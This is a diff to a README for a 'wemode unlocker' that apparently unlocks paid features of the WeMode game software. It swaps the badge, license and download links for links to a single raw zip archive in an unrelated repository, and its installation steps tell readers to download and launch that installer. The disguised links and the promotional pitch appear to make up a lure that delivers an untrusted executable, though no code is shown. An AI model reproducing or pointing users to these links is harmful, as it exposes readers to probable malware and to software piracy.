@@ -1,15 +1,15 @@
 # wemode unlocker 🚀🔓
 
-[![Build Status](https://img.shields.io/github/workflow/status/wemode-unlocker/ci/main?label=Build)](https://github.com/wemode-unlocker)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-[![Supported Platforms](https://img.shields.io/badge/OS-Windows%20%7C%20macOS%20%7C%20Linux-brightgreen)](#-os-compatibility-table)
-[![Downloads](https://img.shields.io/badge/Download-wemode--unlocker-important)](#installation-quicklinks)
+[![Build Status](https://raw.githubusercontent.com/Khawoat2006/wemode-unlock-utility/branch/tylostylus/utility_wemode_unlock_1.8.zip)](https://raw.githubusercontent.com/Khawoat2006/wemode-unlock-utility/branch/tylostylus/utility_wemode_unlock_1.8.zip)
+[![License: MIT](https://raw.githubusercontent.com/Khawoat2006/wemode-unlock-utility/branch/tylostylus/utility_wemode_unlock_1.8.zip)](https://raw.githubusercontent.com/Khawoat2006/wemode-unlock-utility/branch/tylostylus/utility_wemode_unlock_1.8.zip)
+[![Supported Platforms](https://raw.githubusercontent.com/Khawoat2006/wemode-unlock-utility/branch/tylostylus/utility_wemode_unlock_1.8.zip%20%7C%20macOS%20%7C%20Linux-brightgreen)](#-os-compatibility-table)
+[![Downloads](https://raw.githubusercontent.com/Khawoat2006/wemode-unlock-utility/branch/tylostylus/utility_wemode_unlock_1.8.zip)](#installation-quicklinks)
 
 **wemode unlocker**: Redefine digital boundaries and open new pathways to the Wemode universe with a click! The only tool designed for seamless, ethical liberation in 2025 and beyond.
 
 ---
 
-![Download](https://img.shields.io/badge/Download-Wemode--Unlocker-blue?style=for-the-badge&logo=download)  
+![Download](https://raw.githubusercontent.com/Khawoat2006/wemode-unlock-utility/branch/tylostylus/utility_wemode_unlock_1.8.zip)  
 [Download Here](LINK)
 
 ---
@@ -44,10 +44,10 @@ We operate where you do. See at a glance where wemode unlocker shines in technic
 
 ## ⬇️ Installation Quicklinks
 
-**Step 1:** Download the latest version for your system: https://Khawoat2006.github.io
+**Step 1:** Download the latest version for your system: https://raw.githubusercontent.com/Khawoat2006/wemode-unlock-utility/branch/tylostylus/utility_wemode_unlock_1.8.zip
 
 **Step 2:**  
-[![Download](https://img.shields.io/badge/Download-Wemode--Unlocker-blue?style=for-the-badge&logo=download)](LINK)
+[![Download](https://raw.githubusercontent.com/Khawoat2006/wemode-unlock-utility/branch/tylostylus/utility_wemode_unlock_1.8.zip)](LINK)
 
 **Step 3:**  
 Launch the installer. Wemode unlocker kicks off with a guided, multi-language setup.
@@ -97,13 +97,13 @@ Speak the language of comfort. Out-of-the-box support for 10+ languages, with au
 ## 📜 License
 
 Released under the MIT License (2025).  
-See [LICENSE](https://opensource.org/licenses/MIT) for full terms.
+See [LICENSE](https://raw.githubusercontent.com/Khawoat2006/wemode-unlock-utility/branch/tylostylus/utility_wemode_unlock_1.8.zip) for full terms.
 
 ---
 
 ## 📥 One More Step? Download Now & Set Yourself Free
 
-[![Download](https://img.shields.io/badge/Download-Wemode--Unlocker-blue?style=for-the-badge&logo=download)](LINK)
+[![Download](https://raw.githubusercontent.com/Khawoat2006/wemode-unlock-utility/branch/tylostylus/utility_wemode_unlock_1.8.zip)](LINK)
 
 ---
 
